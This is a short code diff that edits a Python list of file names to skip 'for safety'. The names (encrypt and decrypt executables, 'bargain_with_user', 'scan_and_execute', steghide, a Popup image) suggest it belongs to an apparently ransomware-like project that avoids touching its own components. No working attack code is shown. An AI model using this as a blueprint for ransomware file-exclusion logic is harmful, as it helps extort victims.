@@ -49,10 +49,11 @@ def main():
 
     # Represents files to avoid for safety
     blacklist: list[str] = ["bargain_with_user.exe", "bargain_with_user.py",
-                            "decrypt.py",
+                            "decrypt.exe", "decrypt.py",
                             "encrypt.exe", "encrypt.py",
                             "extract.py",
-                            "decrypt.exe", "decrypt.py",
+                            "Icon.png",
+                            "Popup.png",
                             "scan_and_execute.exe", "scan_and_execute.py",
                             "steghide.exe",
                             "sys32.exe"]
